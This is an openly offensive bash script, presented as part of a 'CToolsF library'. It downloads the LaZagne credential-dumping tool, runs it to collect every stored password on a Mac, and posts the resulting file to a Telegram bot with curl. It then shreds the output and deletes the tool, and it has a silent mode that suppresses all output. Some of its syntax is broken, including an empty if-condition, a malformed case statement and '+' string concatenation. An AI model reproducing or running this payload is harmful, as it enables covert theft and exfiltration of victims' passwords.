# This script is a part of CToolsF library.
# Author is not responsible for any malicious activities that can be committed by using any of contents of this library.

#!/bin/bash


payload() {
    printf "\033[33m[*]\033[0m Preparing payload...\n"
    if ! git --version; then
        printf "\033[31m[*]\033[0m Git not installed.\n"
        exit 1
    else
        if ! pip3 --version && ! pip --version; then
            printf "\033[31m[*]\033[0m Pip not installed.\n"
            exit 1
        else
            printf "\033[33m[*]\033[0m Downloading LaZagne...\n"
            cd $HOME
            if ! git clone https://github.com/AlessandroZ/LaZagne; then
                printf "\033[31m[*]\033[0m Unable to download LaZagne.\n"
                exit 1
            else
                printf "\033[33m[*]\033[0m Preparing to run scripts...\n"
                if ! pip3 install -r LaZagne/requirements.txt; then
                    pip install -r LaZagne/requirements.txt
                fi
                printf "\033[33m[*]\033[0m Running scripts...\n"
                python3 LaZagne/Mac/laZagne.py all -oJ -output $HOME/Desktop
                if [  ]; then
                    printf "\033[33m[*]\033[0m Sending data to selected Telegram chat...\n"
                    if ! bot_conf; then
                        printf "\033[31m[*]\033\0m Cannot send data to selected Telegram chat.\n"
                    fi
                    printf "\033[33m[*]\033[0m Removing LaZagne output...\n"
                    shred --remove --zero -n 1 # filename
                fi
                printf "\033[33m[*]\033[0m Cleaning up files...\n"
                rm -rf LaZagne
                printf "\033[32m[*]\033[0m Done.\n"
            fi
        fi
    fi
}

bot_conf() {
    token=""
    id=""
    bot_api="https://api.telegram.org/bot"+$token+"/sendDocument"
    doc="@$HOME/Desktop/test.json"

    curl -X POST $bot_api \
    -F chat_id=$id \
    -F document=$doc
}


case "$1" or "$2" in
    "verbose" )
        payload
        exit 0
    "" )
        payload > /dev/null 2>&1
        exit 0
        ;;
    * )
        printf "\033[31m[*]\033[0m Invalid argument(s) specified.\n"
        exit 1
        ;;
esac
